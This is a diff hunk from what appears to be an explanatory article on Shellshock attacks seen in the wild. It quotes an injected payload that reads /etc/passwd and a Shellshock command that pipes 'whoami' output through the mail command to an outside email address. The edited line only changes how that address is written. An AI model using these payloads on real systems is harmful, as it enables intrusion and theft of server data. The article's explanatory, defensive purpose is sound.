@@ -62,7 +62,7 @@ HTTP_HOST=cloudflare.com
 </code></pre>
 	<p>That reads the password file <code>/etc/passwd</code>, and adds it to the response from the web server. So an attacker injecting this code through the Shellshock vulnerability would see the password file dumped out onto their screen as part of the web page returned.</p>
 	<p>In one attack they simply email private files to themselves. To get data out via email, attackers are using the <code>mail</code> command like this:</p>
-	<pre><code>() { :;}; /bin/bash -c \"whoami | mail -s 'example.com l' [email protected]
+	<pre><code>() { :;}; /bin/bash -c \"whoami | mail -s 'example.com l' xxxxxxxxxxxxxxxx@gmail.com
 </code></pre>
 	<p>That command first runs <code>whoami</code> to find out the name of the user running the web server. That's especially useful because if the web server is being run as root (the superuser who can do anything) then the server will be a particularly rich target.</p>
 	<p>It then sends the user name along with the name of the web site being attacked (example.com above) via email. The name of the website appears in the email subject line.</p>
